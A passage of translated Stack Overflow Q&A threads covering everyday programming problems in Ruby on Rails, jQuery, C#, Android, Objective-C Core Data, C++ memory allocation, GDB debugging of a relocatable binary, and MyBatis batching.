然后解析一下`chunk_file`，看看解析了多少数据。如果相等，继续；如果没有，它在那里被破坏了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-06T01:58:17.913

我建议尝试类似：

```
with open('largeFile.csv', 'r') as csvfile:
    for k, line in enumerate(csvfile):
        row = line.strip().split(',')
        if len(row) != <YourExpectedNumberOfColumns>:
            print(k,row) 
```

这代表了大部分打印有问题的行的机会，这可能有助于您集中调试工作。

# google-app-engine - 无法创建域的管理员帐户

> ID：14111869
> 
> 赞同：1
> 
> 时间：2013-01-01T15:59:35.840
> 
> 标签：google-app-engine

刚刚购买了一个新域@博客，我无法在 Google App Engine 上为我的域创建我的管理员帐户，以便创建我的免费 1 帐户仅限管理员登录。我购买已经两天了，服务器仍然关闭。有人可以帮我吗？显示错误消息：

Google Apps 服务器错误 请稍后再试。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-02T01:05:49.653

由于 Google 自动为您创建了一个新的管理员帐户，因此您只需使用 bloggeradmin 作为您的用户名登录，并使用与您的博客相同的密码。这里为您详细解答。

[http://productforums.google.com/forum/#!msg/apps/7kC61VTXIPk/119XuuYXh2AJ](http://productforums.google.com/forum/#!msg/apps/7kC61VTXIPk/119XuuYXh2AJ)

# ruby-on-rails - Rails 中的 RSpec 具有“MyString”属性

> ID：14111873
> 
> 赞同：0
> 
> 时间：2013-01-01T15:59:48.767
> 
> 标签：ruby-on-rails, ruby, rspec

我的 RSpec 测试不断弹出这些“MyString”属性。人们说这与固定装置有关，但我不使用它们。我删除了`test`目录，但问题仍然存在。我正在为工厂/制造商使用制造。我也在使用 Devise 的测试助手。

这是我的控制器规格有问题：

```
it "allows you to see your posts" do
  sign_in Fabricate(:user)
  Fabricate(:post)
  get 'by_me'
  @posts.first.song.should eq "The Sound of Settling"
end 
```

这是我的后期工厂/制造商：

```
Fabricator(:post) do
  song   "The Sound of Settling"
  artist "Death Cab for Cutie"
  album  "Transatlantism"
  username "foo"
end 
```

还有我的用户工厂/制造商：

```
Fabricator(:user) do
  username "foo"
  password "password"
  password_confirmation "password"
end 
```

这是失败消息：

```
 1) PostsController allows you to see your posts
     Failure/Error: Post.first.song.should eq "The Sound of Settling"

       expected: "The Sound of Settling"
            got: "MyString"

       (compared using ==)
     # ./spec/controllers/posts_controller_spec.rb:31:in `block (2 levels) in <top (required)>' 
```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T18:10:11.113

我不知道发生了什么，但问题已经消失了。

# ruby-on-rails - 修改 rails 新命令

> ID：14111874
> 
> 赞同：0
> 
> 时间：2013-01-01T16:00:01.857
> 
> 标签：ruby-on-rails, rubygems, gem

执行`rails new ...`命令时，最终`bundle install`会执行任务。对于我的许多项目，我需要相同的 gem，并且必须在创建应用程序*后*手动添加它们，然后`bundle install`再次手动运行。

有没有办法*在*`rails new`生成应用程序时修改命令以在 Gemfile 中写入这些 gem ，以便在执行 bundle install 时我的所有 gem 都已经到位？理想情况下，只有在我提供可选参数时才会触发？

 ** * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T16:05:30.100

尝试使用[应用程序模板](http://guides.rubyonrails.org/generators.html#application-templates)*

# javascript - 动态使用 jQuery 和样式

> ID：14111877
> 
> 赞同：0
> 
> 时间：2013-01-01T16:00:11.700
> 
> 标签：javascript, jquery

我对这段代码有疑问：如果您单击“附加文本”两次，您将获得 2 个 div，一个内容为“hello2”，一个内容为“hello3”，但是当您单击它们时，它们会打开相同的块. 让他们每个人都打开自己的块。（我想保持动态创建。）感谢您的帮助

```
<!DOCTYPE html>
<html>
<head>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js">
</script>
<script>
var k=1;
$(document).ready(function(){
  $("#flip").click(function(){
    $("#panel").slideToggle("slow");
  });
});
function appendText()
{
  k=k+1;
  var css = '#flip'+k+' { padding:5px; text-align:center; background-color:#ffff00;   border:solid 1px #c3c3c3;}',
  head = document.getElementsByTagName('head')[0],
  style = document.createElement('style');
  style.type = 'text/css';
  if (style.styleSheet){
    style.styleSheet.cssText = css;
  } else {
    style.appendChild(document.createTextNode(css));
  }

  head.appendChild(style);

  var css = '#panel'+k+'{padding:50px;display:none;text-align:center; background-   color:#'+k+''+k+''+k+''+k+''+k+''+k+'; border:solid 1px #c3c3c3;}',
  head = document.getElementsByTagName('head')[0],
  style = document.createElement('style');
  style.type = 'text/css';
  if (style.styleSheet){
    style.styleSheet.cssText = css;
  } else {
    style.appendChild(document.createTextNode(css));
  }
  head.appendChild(style);

  var flip2 = document.createElement("div");
  flip2.innerHTML = "Hello"+k;
  flip2.id = ("flip"+k);

  var panel2= document.createElement("div");
  panel2.innerHTML = "Hello"+k;
  panel2.id = ("panel"+k);

  document.body.appendChild(flip2);
  document.body.appendChild(panel2);

  $(document).ready(function(){
    $(("#flip"+k)).click(function(){
      $(("#panel"+k)).slideToggle("slow");
    });
  });
}
</script>

<style type="text/css"> 
#panel,#flip
{
padding:5px;
text-align:center;
background-color:#e5eecc;
border:solid 1px #c3c3c3;
}
#panel
{
padding:50px;
display:none;
}
</style>
</head>
<body>

<p>This is a paragraph.</p>
<button onclick="appendText()">Append text</button>

<div id="flip">Click to slide the panel down or up</div>
<div id="panel">Hello world!</div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:05:55.647

问题是您的变量`k`是**全局**的。当它发生变化时，您的事件处理程序都会看到相同的值（首先是 2，然后是 3，然后是 4，等等）。

像这样设置您的事件处理程序：

```
(function(kk) {
  $(("#flip"+kk)).click(function(){
    $(("#panel"+kk)).slideToggle("slow");
  });
})(k); 
```

完全没有理由在添加元素的函数内部使用“就绪”处理程序。

# c# - Facebook Graph API HTTP POST 照片上传

> ID：14111878
> 
> 赞同：-2
> 
> 时间：2013-01-01T16:00:17.630
> 
> 标签：c#, facebook, http, facebook-graph-api

我正在玩 HTTP Posts，想知道是否有人可以帮助我使用 HTTP Post 请求将照片上传到 Facebook 的方法。我有一个访问令牌，可以访问用户的数据，包括 ID、姓名等。但是弄清楚上传的 uri 是一个很大的困惑。

我正在用 C# 实现代码，大多数（如果不是全部）在线资源都是针对 php 的。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T09:41:22.407

首先，阅读以下内容：

[图形接口](http://developers.facebook.com/docs/reference/api/)

您的任务有两种不同的方式。

*   上传照片到相册
*   发布照片作为链接发布的一部分

如果你想上传照片，你需要像这样配置请求：

```
https://graph.facebook.com/{USER_ALBUM_ID_IN_WHICH_YOU_WANT_TO_UPLOAD_PHOTO}
/photos?
message={MESSAGE_THAT_YOU_WANT_ADD_TO_PHOTO}&
source={SOURCE_OF_PHOTO}&
place={PLACE_NOT_INTERESTING}&
access_token={YOU_KNOW_ACCESS_TOKEN} 
```

另外，你可以看看[这个](http://developers.facebook.com/docs/reference/api/photo/)和[这个](https://developers.facebook.com/blog/post/498/)

# c# - 绑定DataSource时如何防止selectedindexchanged事件？

> ID：14111879
> 
> 赞同：25
> 
> 时间：2013-01-01T16:00:25.163
> 
> 标签：c#, .net, combobox

我有 ComboBox 控件（WinForm 项目）。

当我将 DataSource 绑定到 ComboBox 控件时，会触发 combobox_selectedindexchanged 事件。

知道如何在绑定 DataSource 时防止 selectedindexchanged 事件吗？

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2013-01-01T16:43:39.097

删除 SelectedIndex_Changed 事件的处理程序，绑定您的数据，然后重新添加处理程序。以下是如何在方法中完成此操作的简单示例：

```
private void LoadYourComboBox()
{
    this.comboBox1.SelectedIndexChanged -= new EventHandler(comboBox1_SelectedIndexChanged);

        // Set your bindings here . . .

    this.comboBox1.SelectedIndexChanged += new EventHandler(comboBox1_SelectedIndexChanged);
} 
```

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2015-07-30T12:02:28.750

我知道这是一篇旧帖子，它有一个公认的答案，但我认为我们可以使用[SelectionChangeCommitted](https://msdn.microsoft.com/en-us/library/system.windows.forms.combobox.selectionchangecommitted.aspx)事件作为解决方案，以避免在数据绑定期间触发事件。

SelectionChangeCommitted 事件仅在用户更改组合框中的选择时触发。

SO上有一个[类似的问题](https://stackoverflow.com/questions/3263240/stop-comboboxs-selectedindexchanged-event-from-firing-when-the-form-loads)，这个答案由@arbiter提供。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2016-08-12T09:25:41.087

使用`SelectionChangeCommitted`事件而不是“SelectedIndexChanged”

> `SelectionChangeCommitted`仅在用户更改组合框选择时引发。Do not use `SelectedIndexChanged`or `SelectedValueChanged`to capture user changes, because those events are also raised when the selection changes programmatically.

来自[https://msdn.microsoft.com/en-us/library/system.windows.forms.combobox.selectionchangecommitted.aspx](https://msdn.microsoft.com/en-us/library/system.windows.forms.combobox.selectionchangecommitted.aspx)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-01T16:14:01.707

不要以为你可以阻止事件但你无法处理它。

分离事件处理程序，绑定，然后附加事件处理程序。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-03-07T09:17:18.597

这是简单的方法。您可以使用组合框的 Tag 属性。当它为空或尚未完成时，它可以为空或 0 整数值。您必须在绑定后将组合框的标签设置为它的项目数。在 SelectedValueChanged 事件中，如果 Tag 属性为 null 或 0，您必须从 void 返回。

这是我项目中的一些示例。

```
private void cb_SelectedValueChanged(object sender, EventArgs e)
{
    if (!(sender is ComboBox)) return;
    ComboBox cb = sender as ComboBox;
    if (DataUtils.ToInt(cb.Tag, 0) == 0) return;
    if (cbSmk.SelectedValue == null ) return;
    /* Continue working;  */
}

public static void ComboboxFill(ComboBox cb, string keyfld, string displayfld, string sql)
{          
    try
    {
        cb.Tag = 0;
        cb.DataSource = null;
        cb.Items.Clear();

        DataSet ds = DataMgr.GetDsBySql(sql);
        if (!DataUtils.HasDtWithRecNoErr(ds))
        {                    
            cb.Text = "No data";
        }
        else
        {
            cb.DataSource = ds.Tables[0];
            cb.DisplayMember = displayfld;
            cb.ValueMember = keyfld;
        }
        cb.Tag = cb.Items.Count;
    }
    catch (Exception ex)
    {
        Int32 len = ex.Message.Length > 200 ? 200 : ex.Message.Length;
        cb.Text = ex.Message.Substring(0, len);
    }                
}

CmpHelper.ComboboxFill(cbUser, "USER_ID", "USER_NAME", "SELECT * FROM SP_USER WHERE 1=1 ORDER by 1",-1); 
```

# objective-c - 发送到 Core Data 的无法识别的选择器导致应用程序崩溃

> ID：14111882
> 
> 赞同：1
> 
> 时间：2013-01-01T16:01:03.173
> 
> 标签：objective-c, ios, core-data

我有一个 iPad 应用程序，使用 XCode 4.5、Storyboards、iOS 6 和 MagicalRecord。此代码导致错误，我不明白为什么。两者`aApptStart`和`selectedStartDate`都定义为 DateTime。那么，是什么原因造成的呢？

这是有问题的代码：

```
- (IBAction)saveAppointment:(UIButton *)sender {

    NSManagedObjectContext *localContext = [NSManagedObjectContext MR_contextForCurrentThread];
    AppointmentInfo *newAppointment = [AppointmentInfo createEntity];  //  create the entity

    NSLog(@"Selected start Date (save): %@", [self formatSelectedDate: selectedStartDate]); 

    newAppointment.aApptStart = selectedStartDate;  //  <------  causing the error
    newAppointment.aApptEnd= selectedEndDate;
    newAppointment.aTech = selectedTech;

    [localContext MR_saveNestedContexts];
} 
```

这是我得到的错误：

> 由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[NSManagedObject setAApptStart:]: unrecognized selector sent to instance 0xee85dd0”

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T16:08:21.333

> 那么，是什么原因造成的呢？

该错误表明 AppointmentInfo 中没有该名称的属性。

那么，您的 NSManagedObject 子类 (AppointmentInfo) 是否声明了属性 aApptStart？此外，您的实体是否存在相应的属性（如果该属性是`@dynamic`同盟实现的）？

我想它会......也许是一个错字？你能展示 AppointmentInfo 的接口和实现吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:21:16.370

显然，您`[AppointmentInfo createEntity]`没有返回类型的对象，`AppointmentInfo`但`NSManagedObject`也`NSManagedObject`没有提供选择器来`setAApptStart`表示没有属性的设置器`aApptStart`。

你到底`+(AppointmentInfo*) createEntity`长什么样？

# android - 共享密码偏好

> ID：14111890
> 
> 赞同：1
> 
> 时间：2013-01-01T16:02:41.500
> 
> 标签：android

我从论坛上读到了一些东西。有人开发了一个安卓应用程序。他使用 SharedPreference 而不是 SQLite 来存储密码。

我想知道原因。与 SQLite 相比，SharedPreference 是否具有更高的安全性？

我在 Google 上搜索了 SharedPreference，但并不真正了解它。

感谢您的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:10:43.497

如果你用谷歌搜索得足够好，你会得到比知道更多的信息。严重地。

1.  [每种方法的优缺点](https://stackoverflow.com/a/4909752/1782481)。
2.  [安全相关的讨论](https://stackoverflow.com/a/3609268/1782481)。
3.  [一个基本的区别](https://stackoverflow.com/a/6276936/1782481)。

还有什么？**这一切都在**！耶。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:09:16.947

当然，我不知道“某人”的动机，但我可以想象它只是实现起来更简单。它当然不会更安全。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T16:51:54.743

我两者都用，当我问他时，我的导师告诉我的是这真的是个人喜好问题。我使用 mysql 和共享首选项作为 android 应用程序中的会话的等价物 + 从我可以告诉它共享首选项的预期目的以及如果我不需要，为什么将这种简单数据存储在 mysqlite db 中？我只需要存储一些短数据字段，并且不需要编辑这些数据。Mysqlite 在这种情况下有点矫枉过正，但这里有一些很好的例子：

共享首选项：

[http://www.androidhive.info/2012/08/android-session-management-using-shared-preferences/](http://www.androidhive.info/2012/08/android-session-management-using-shared-preferences/)

使用 mysqlite 登录：

[http://www.androidhive.info/2012/01/android-login-and-registration-with-php-mysql-and-sqlite/](http://www.androidhive.info/2012/01/android-login-and-registration-with-php-mysql-and-sqlite/)

（注意：如果你 dl 来自两个登录示例的源代码可以很容易地转换为使用共享首选项。该站点上的几乎所有代码都已重构为单独的类，可以反复重用，几乎不需要编辑。

不要误会我的意思，我确实使用 mysqlite 来缓存用户配置文件/提要等。所以他们不必等待它加载，最终我可能会使用所有 3 个（mysql、共享首选项和 mysqlite）进行登录。（例如：允许用户第一次注册->查询mysql，将数据存储为共享首选项作为会话，将用户数据存储在mysqlite中，以便用户注册后可以登录并查看现有的缓存消息等..甚至w. 通过查询 mysqlite db 并将返回的值存储在共享首选项中来断开 Internet 连接（我当然会在服务器端收到信号后立即验证这些凭据/在我允许他们更改或编辑任何内容之前.

# assembly - GDB x64：替换指令时无法访问内存

> ID：14111892
> 
> 赞同：0
> 
> 时间：2013-01-01T16:02:57.103
> 
> 标签：assembly, gdb, x86-64

（我在 Debian 7，arm64 上）

为了强制 vmware-networks 输出日志而不是转储它，我想修改日志记录功能。在我的 Windows 机器上使用 IDA，我在`.text:0000000000068900 jz loc_689A4`.

运行`gdb /usr/bin/vmware-networks`时出现指令：

```
(gdb) x 0x68900
0x68900:        0x009e840f
(gdb) x/i 0x68900
0x68900:     je     0x689a4 
```

但是当试图断点时，我得到

```
(gdb) break *0x68900
Breakpoint 1 at 0x68900
(gdb) run --start
Starting program: /usr/bin/vmware-networks --start
Warning:
Cannot insert breakpoint 1.
Error accessing memory address 0x68900: Input/output error. 
```

并且在“运行”之前尝试热线指令时，我得到 (gdb) set *0x68900= 0x009e850f Cannot access memory at address 0x68900

为什么会这样，我该如何解决？是的，我在 root 上运行，所以（通常）不应该有任何问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T18:08:06.550

问题是这个二进制文件是可重定位的。`break main`其次`run`为您提供旧`main`位置和搬迁位置：

```
(gdb) break main
Breakpoint 1 at 0x1e990
(gdb) run --start
Starting program: /usr/bin/vmware-networks --start
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00007ffff7f1a990 in main () 
```

=> 瞧，我们的重定位偏移量为 0x7FFFF7EFC000。将此添加到任何“旧”偏移量中，您就有了重新定位的用于检查、编辑等的偏移量：

```
(gdb) x/i 0x7FFFF7F64900
0x7ffff7f64900:      je     0x7ffff7f649a4 
```

在 IDA 中重新定位整个二进制文件，以便在那里获得适当的偏移量，如果你愿意的话，你也可以在那里完成。

# android - 导入android.support.v13.app.FragmentActivity无法解析

> ID：14111898
> 
> 赞同：6
> 
> 时间：2013-01-01T16:03:36.323
> 
> 标签：android, eclipse, class, project, libs

我正在测试一个 android 项目（[http://developer.android.com/training/animation/screen-slide.html](http://developer.android.com/training/animation/screen-slide.html)），我在一个类中有一个错误。

```
/*
 * Copyright 2012 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.example.screensidetest2;

import android.app.Fragment;
import android.app.FragmentManager;
import android.content.Intent;
import android.os.Bundle;
import android.support.v13.app.FragmentActivity;
import android.support.v4.app.FragmentStatePagerAdapter;
import android.support.v4.app.NavUtils;
import android.support.v4.view.PagerAdapter;
import android.support.v4.view.ViewPager;
import android.view.Menu;
import android.view.MenuItem;

/**
 * Demonstrates a "screen-slide" animation using a {@link ViewPager}. Because {@link ViewPager}
 * automatically plays such an animation when calling {@link ViewPager#setCurrentItem(int)}, there
 * isn't any animation-specific code in this sample.
 *
 * <p>This sample shows a "next" button that advances the user to the next step in a wizard,
 * animating the current screen out (to the left) and the next screen in (from the right). The
 * reverse animation is played when the user presses the "previous" button.</p>
 *
 * @see ScreenSlidePageFragment
 */
public class ScreenSlideActivity extends FragmentActivity {
    /**
     * The number of pages (wizard steps) to show in this demo.
     */
    private static final int NUM_PAGES = 5;

    /**
     * The pager widget, which handles animation and allows swiping horizontally to access previous
     * and next wizard steps.
     */
    private ViewPager mPager;

    /**
     * The pager adapter, which provides the pages to the view pager widget.
     */
    private PagerAdapter mPagerAdapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_screen_slide);

        // Instantiate a ViewPager and a PagerAdapter.
        mPager = (ViewPager) findViewById(R.id.pager);
        mPagerAdapter = new ScreenSlidePagerAdapter(getFragmentManager());
        mPager.setAdapter(mPagerAdapter);
        mPager.setOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            @Override
            public void onPageSelected(int position) {
                // When changing pages, reset the action bar actions since they are dependent
                // on which page is currently active. An alternative approach is to have each
                // fragment expose actions itself (rather than the activity exposing actions),
                // but for simplicity, the activity provides the actions in this sample.
                invalidateOptionsMenu();
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        getMenuInflater().inflate(R.menu.activity_screen_slide, menu);

        menu.findItem(R.id.action_previous).setEnabled(mPager.getCurrentItem() > 0);

        // Add either a "next" or "finish" button to the action bar, depending on which page
        // is currently selected.
        MenuItem item = menu.add(Menu.NONE, R.id.action_next, Menu.NONE,
                (mPager.getCurrentItem() == mPagerAdapter.getCount() - 1)
                        ? R.string.action_finish
                        : R.string.action_next);
        item.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM | MenuItem.SHOW_AS_ACTION_WITH_TEXT);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case android.R.id.home:
                // Navigate "up" the demo structure to the launchpad activity.
                // See http://developer.android.com/design/patterns/navigation.html for more.
                NavUtils.navigateUpTo(this, new Intent(this, MainActivity.class));
                return true;

            case R.id.action_previous:
                // Go to the previous step in the wizard. If there is no previous step,
                // setCurrentItem will do nothing.
                mPager.setCurrentItem(mPager.getCurrentItem() - 1);
                return true;

            case R.id.action_next:
                // Advance to the next step in the wizard. If there is no next step, setCurrentItem
                // will do nothing.
                mPager.setCurrentItem(mPager.getCurrentItem() + 1);
                return true;
        }

        return super.onOptionsItemSelected(item);
    }

    /**
     * A simple pager adapter that represents 5 {@link ScreenSlidePageFragment} objects, in
     * sequence.
     */
    private class ScreenSlidePagerAdapter extends FragmentStatePagerAdapter {
        public ScreenSlidePagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int position) {
            return ScreenSlidePageFragment.create(position);
        }

        @Override
        public int getCount() {
            return NUM_PAGES;
        }
    }
} 
```

我在 libs 中添加了 jar（我同时拥有 v13 和 v4），但错误仍然存​​在。谢谢你。

编辑：将 v13 更改为 v4 后，许多错误正在消失，仅剩 2 个。

```
private class ScreenSlidePagerAdapter extends FragmentStatePagerAdapter {
        public ScreenSlidePagerAdapter(FragmentManager fm) {
            super(fm);
        } 
```

> 超级（调频）；构造函数 FragmentStatePageAdapter(FragmentManager) 未定义。

和

```
public Fragment getItem(int position) {
    return ScreenSlidePageFragment.create(position);
} 
```

> public Fragment getItem(int position) - 返回类型与 FragmentStatePageAdapter.getItem(int) 不兼容。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-28T16:46:31.823

我被阻止了一段时间，只是设法修复它，

尝试使用`getSupportFragmentManager()`而不是`getFragmentManager()`.

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-01-02T08:20:21.050

将“import android.support.v13.app.FragmentActivity”更改为“import android.support.v4.app.FragmentActivity”

对于未定义的部分，请尝试以下语法：

```
public class ScreenSlidePagerAdapter extends FragmentStatePagerAdapter {
    public ScreenSlidePagerAdapter (android.support.v4.app.FragmentManager fm) {
        super(fm);
    } 
```

和：

```
@Override
    public android.support.v4.app.Fragment getItem(int position) {
        return ScreenSlidePagerAdapter.create(position);
    } 
```

原始建议：您是否已将库添加到构建路径中？只需右键单击项目，就会列出菜单项“Java Build Path”。选择此项并将库添加到您的路径中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-05-06T10:37:42.450

**这是一个完整的代码供进一步参考**

```
package com.team.test;

import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.os.Bundle;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentStatePagerAdapter;
import android.support.v4.app.NavUtils;
import android.support.v4.view.PagerAdapter;
import android.support.v4.view.ViewPager;
import android.view.Menu;
import android.view.MenuItem;

/**
 * Demonstrates a "screen-slide" animation using a {@link ViewPager}. Because
 * {@link ViewPager} automatically plays such an animation when calling
 * {@link ViewPager#setCurrentItem(int)}, there isn't any animation-specific
 * code in this sample.
 * 
 * <p>
 * This sample shows a "next" button that advances the user to the next step in
 * a wizard, animating the current screen out (to the left) and the next screen
 * in (from the right). The reverse animation is played when the user presses
 * the "previous" button.
 * </p>
 * 
 * @see ScreenSlidePageFragment
 */
public class MenuActivity extends FragmentActivity {
    /**
     * The number of pages (wizard steps) to show in this demo.
     */
    private static final int NUM_PAGES = 6;

    /**
     * The pager widget, which handles animation and allows swiping horizontally
     * to access previous and next wizard steps.
     */
    private ViewPager mPager;

    /**
     * The pager adapter, which provides the pages to the view pager widget.
     */
    private PagerAdapter mPagerAdapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        setContentView(R.layout.activity_screen_slide);

        // Instantiate a ViewPager and a PagerAdapter.
        mPager = (ViewPager) findViewById(R.id.pager);
        mPagerAdapter = new ScreenSlidePagerAdapter(getSupportFragmentManager());
        mPager.setAdapter(mPagerAdapter);
        mPager.setOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            @Override
            public void onPageSelected(int position) {
                // When changing pages, reset the action bar actions since they
                // are dependent
                // on which page is currently active. An alternative approach is
                // to have each
                // fragment expose actions itself (rather than the activity
                // exposing actions),
                // but for simplicity, the activity provides the actions in this
                // sample.
                invalidateOptionsMenu();
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        getMenuInflater().inflate(R.menu.activity_screen_slide, menu);

        menu.findItem(R.id.action_previous).setEnabled(
                mPager.getCurrentItem() > 0);

        // Add either a "next" or "finish" button to the action bar, depending
        // on which page
        // is currently selected.
        MenuItem item = menu
                .add(Menu.NONE,
                        R.id.action_next,
                        Menu.NONE,
                        (mPager.getCurrentItem() == mPagerAdapter.getCount() - 1) ? R.string.action_finish
                                : R.string.action_next);
        item.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM
                | MenuItem.SHOW_AS_ACTION_WITH_TEXT);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
        case android.R.id.home:
            // Navigate "up" the demo structure to the launchpad activity.
            // See http://developer.android.com/design/patterns/navigation.html
            // for more.
            NavUtils.navigateUpTo(this, new Intent(this, Login.class));
            return true;

        case R.id.action_previous:
            // Go to the previous step in the wizard. If there is no previous
            // step,
            // setCurrentItem will do nothing.
            mPager.setCurrentItem(mPager.getCurrentItem() - 1);
            return true;

        case R.id.action_next:
            // Advance to the next step in the wizard. If there is no next step,
            // setCurrentItem
            // will do nothing.
            mPager.setCurrentItem(mPager.getCurrentItem() + 1);
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    /**
     * A simple pager adapter that represents 5 {@link ScreenSlidePageFragment}
     * objects, in sequence.
     */
    public class ScreenSlidePagerAdapter extends FragmentStatePagerAdapter {
        public ScreenSlidePagerAdapter(android.support.v4.app.FragmentManager fm) {
            super(fm);
        }

        @Override
        public android.support.v4.app.Fragment getItem(int position) {
            return ScreenSlidePageFragment.create(position);
        }

        @Override
        public int getCount() {
            return NUM_PAGES;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-06-29T06:38:28.740

**我想我应该解释一下区别...**

如果你想支持 api <11。然后你应该`import android.support.v4.app.FragmentPagerAdapter;`然后创建所有片段`import android.support.v4.app.Fragment;`，你就完成了。

**API==11**

如果不想支持`api <11`。或者您只是想使用简单的 Fragment（不支持），那么您应该 `import android.support.v13.app.FragmentPagerAdapter;`getItem 将需要一个简单的`Fragment`.

```
@Override
    public android.app.Fragment getItem(int position) {
        return ScreenSlidePagerAdapter.create(position);
    } 
```

# c++ - 在 void 指针上使用 new

> ID：14111900
> 
> 赞同：18
> 
> 时间：2013-01-01T16:03:40.497
> 
> 标签：c++

```
int main()
{
    void* Foo = new???
    delete Foo;
} 
```

你怎么做像上面这样的事情？你不能放`new void[size]`。而且我不想知道如何使用`malloc()`and来做到这一点`free()`。我已经知道这行得通。我很好奇，想知道 new 和 delete 是如何完成的。

我用谷歌搜索了一下，看到了一些关于`operator new(size)`; 和`operator delete(size)`;

`new`这些和/有什么区别`delete`？为什么 C++ 不仅仅允许 new `void* [size]`？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2013-01-01T16:06:40.367

这可以解决问题：

```
int main()
{
    void* Foo = ::operator new(N);
    ::operator delete(Foo);
} 
```

这些运算符分配/释放以字节为单位的原始内存，就像`malloc`.

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-01-01T16:05:13.610

> 为什么 C++ 不仅仅允许 new void[size]？

因为`void`不是对象；它没有大小！应该分配多少空间？请记住，`new T[size]`这**大约**相当于`malloc(sizeof(T) * size)`.

如果您只想要一个原始字节数组，那么您可以使用`char`. ^*

* * *

[* 当然，因为这是 C++，你应该使用类似的东西`std::vector<char>`来避免内存泄漏和异常安全问题。]

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2013-01-01T16:10:02.790

C++ 在使用`new T`. 或`new T[n]`某些类型`T`。如果你真的需要未初始化的内存（你很少这样做），你可以使用`operator new()`and来分配/释放它`operator delete()`：

```
void* ptr = operator new(size);
operator delete(ptr); 
```

（对于数组形式类似）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-01T16:07:25.043

`void *`可转换为任何指针类型。您可以简单地做`void *Foo = new int`或您想要的任何其他类型。但是在 C++ 中确实没有理由这样做。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-01-25T09:45:21.430

你可以做

```
void* data = new char[num_of_bytes]; 
```

以类似于 malloc 的方式分配一些内存

# mysql - mybatis @insert 重新运行批量更新

> ID：14111901
> 
> 赞同：0
> 
> 时间：2013-01-01T16:03:40.910
> 
> 标签：mysql, mybatis, batch-updates

我正在尝试在批处理会话对象上运行自定义 sql

```
@Insert("INSERT INTO ticker(Ticker, GetUpdate) VALUES(#{symbol}, 1) ON DUPLICATE KEY UPDATE GetUpdate = 1")
void enableQuoteforSymbol(@Param("symbol") String symbol); 
```

但是我的以下代码（负责刷新和提交批次）有一些神秘的行为

```
while(true == continueProcessing.get())
{
    List<BatchResult> batchResult;
    try 
    {
        batchResult = batchSqlSession.flushStatements();

        if(batchResult.size() > 0 )
        {
            batchSqlSession.commit();
            batchSqlSession.clearCache();
        }

        Thread.sleep(configurationManager.BATCH_COMMITER_DELAY);
    }
    catch (Exception ex) 
    {
        logger.error("BatchService::run() - ", ex);
    }
} 
```

它执行完美，并且 batchSqlSession.flushStatements() 确实返回了已执行语句的数量。尽管成功执行了上一个批处理，但此代码**batchResult = batchSqlSession.flushStatements();** 和**batchSqlSession.commit();** 在下一次迭代中重新运行相同的旧批次。为什么 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T21:41:18.933

看起来这是一个错误： [http ://code.google.com/p/mybatis/issues/detail?id=695](http://code.google.com/p/mybatis/issues/detail?id=695)

Aready 已为下一个版本修复。

